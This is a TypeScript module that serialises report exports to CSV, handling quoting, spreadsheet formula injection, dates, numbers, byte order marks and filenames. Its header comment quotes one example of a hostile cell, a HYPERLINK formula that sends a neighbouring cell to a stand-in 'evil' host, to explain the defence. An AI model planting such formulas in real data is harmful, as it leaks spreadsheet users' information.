/**
 * CSV serialisation for report exports.
 *
 * Two separate problems are solved here, and they are often confused:
 *
 *  1. ESCAPING, so the file parses. A value containing a comma, a quote or a
 *     newline has to be quoted, with inner quotes doubled. Get this wrong and
 *     a client called `Smith, Jones & Co` silently becomes two columns.
 *
 *  2. FORMULA INJECTION, so the file is safe to open. Excel, LibreOffice and
 *     Sheets execute a cell beginning with = + - @ (or a tab/carriage return
 *     before one) as a formula. A client name stored as
 *     `=HYPERLINK("http://evil/"&A1,"click")` becomes a live formula in
 *     whoever's spreadsheet it lands in, exfiltrating the row beside it. The
 *     data here is the operator's own, but it includes names and notes that
 *     arrived from outside - lead forms, imported clients - so it is not
 *     trusted just because it is in our database.
 *
 * Quoting alone does NOT prevent 2: the spreadsheet strips the quotes before
 * evaluating. The value has to be neutralised as well, which is why both
 * steps happen here rather than at the call sites.
 */

/** The characters a spreadsheet treats as "this cell is a formula". */
const FORMULA_PREFIX = /^[=+\-@\t\r]/

/**
 * Makes a value inert in a spreadsheet without changing what it says.
 *
 * A leading apostrophe is the conventional fix, but it shows up in the cell
 * in some readers. A zero-width character would be invisible and corrupt the
 * value for anyone parsing it later. A single leading tab is what most
 * guidance settles on, so that is what this uses - it is stripped by every
 * spreadsheet on display and keeps the text intact.
 *
 * Negative numbers are deliberately exempt: -42 is a number, not a formula,
 * and mangling every negative figure in a financial export to guard against a
 * string that cannot occur would be worse than the problem.
 */
function neutralise(value: string): string {
  if (!FORMULA_PREFIX.test(value)) return value
  if (/^-?\d+(\.\d+)?$/.test(value)) return value
  return `\t${value}`
}

/** One value, escaped and made safe. */
export function csvCell(value: unknown): string {
  if (value == null) return ""

  let text: string
  if (value instanceof Date) {
    // ISO, not a locale format: an export is read by machines as often as by
    // people, and a locale date is ambiguous between 3 April and 4 March.
    text = value.toISOString().slice(0, 10)
  } else if (typeof value === "number") {
    // Raw figures, unformatted. A spreadsheet should receive 1234.5, not
    // "₹1.2K" - the reader can format it, but cannot recover it.
    text = Number.isFinite(value) ? String(value) : ""
  } else if (typeof value === "boolean") {
    text = value ? "Yes" : "No"
  } else {
    text = String(value)
  }

  const safe = neutralise(text)
  // Quote when the value could otherwise break the row, and whenever it was
  // neutralised - the leading tab must survive the round trip.
  return /[",\r\n\t]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe
}

export type CsvColumn<T> = {
  header: string
  value: (row: T) => unknown
}

/**
 * A complete CSV document.
 *
 * CRLF line endings, because that is what the specification says and what
 * Excel on Windows expects; every other reader accepts them.
 */
export function toCsv<T>(columns: CsvColumn<T>[], rows: T[]): string {
  const lines = [columns.map((column) => csvCell(column.header)).join(",")]
  for (const row of rows) {
    lines.push(columns.map((column) => csvCell(column.value(row))).join(","))
  }
  return lines.join("\r\n")
}

/**
 * The bytes to send, with a UTF-8 byte order mark.
 *
 * Without the BOM, Excel on Windows reads the file as the system codepage and
 * renders ₹ and every accented name as mojibake. Every other reader skips it.
 */
export function csvBody(csv: string): string {
  return `﻿${csv}`
}

/** A filename-safe slug, e.g. "expenses-2026-10-11.csv". */
export function csvFilename(name: string, on = new Date()): string {
  const slug = name
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
  return `${slug || "report"}-${on.toISOString().slice(0, 10)}.csv`
}
